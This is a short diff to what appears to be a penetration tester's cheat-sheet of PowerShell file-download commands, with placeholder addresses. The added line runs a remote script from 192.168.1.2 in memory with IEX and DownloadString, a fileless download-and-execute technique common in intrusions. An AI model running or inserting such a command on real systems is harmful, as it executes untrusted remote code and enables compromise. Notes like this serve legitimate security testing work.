@@ -3,4 +3,7 @@
 Invoke-WebRequest "http://<ip:port>file to get>" -OutFile "C:\Users\administrator\<what to save file as>"
 
 
-(New-Object System.Net.WebClient).DownloadFile("http://<ip:port>/<file to get>", "C:\Windows\Temp\<what to save file as>") 
+(New-Object System.Net.WebClient).DownloadFile("http://<ip:port>/<file to get>", "C:\Windows\Temp\<what to save file as>")
+
+// Download and execute without saving on disk
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.2/test.ps1') 
